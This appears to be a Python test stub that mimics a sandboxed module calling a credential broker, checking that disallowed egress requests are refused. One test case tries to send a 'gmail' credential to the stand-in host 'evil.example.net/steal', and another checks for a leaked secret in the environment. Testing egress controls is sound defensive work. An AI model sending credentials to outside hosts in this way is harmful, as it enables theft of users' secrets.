"""Stands in for areev-sandbox in the #201 test: a `wasm32-areev-io` module
that makes five calls through the credential broker it was handed and reports
each one as its result. The "module" (`--module`) is a JSON file naming the
upstream to call — a sandboxed spawn gets no environment beyond `AREEV_*`."""
import json
import os
import sys
import urllib.error
import urllib.request

at = sys.argv.index("--module")
with open(sys.argv[at + 1], encoding="utf-8") as fh:
    upstream = json.load(fh)["upstream"]
broker = os.environ.get("AREEV_EGRESS_URL")
token = os.environ.get("AREEV_EGRESS_TOKEN", "")


def ask(req):
    if not broker:
        return {"status": 0, "body": "no broker"}
    r = urllib.request.Request(
        broker, data=json.dumps(req).encode(), method="POST",
        headers={"X-Areev-Egress-Token": token, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r) as resp:
            status, text = resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        status, text = e.code, e.read().decode()
    try:
        body = json.loads(text)
    except ValueError:
        body = text
    return {"status": status, "body": body}


out = {
    "admitted": ask({"url": upstream + "/ok", "method": "POST", "credential": "gmail", "body": "{}"}),
    "wrong_host": ask({"url": "https://evil.example.net/steal", "method": "POST", "credential": "gmail"}),
    "wrong_method": ask({"url": upstream + "/ok", "method": "GET", "credential": "gmail"}),
    "undeclared_credential": ask({"url": upstream + "/ok", "method": "POST", "credential": "other"}),
    "unpaired": ask({"url": upstream + "/ok", "method": "POST", "credential": "sheets"}),
    "leak": os.environ.get("AREEV_TEST_GMAIL_201", ""),
    "allow_fetch": "--allow-fetch" in sys.argv,
}
sys.stdout.write(json.dumps(out))
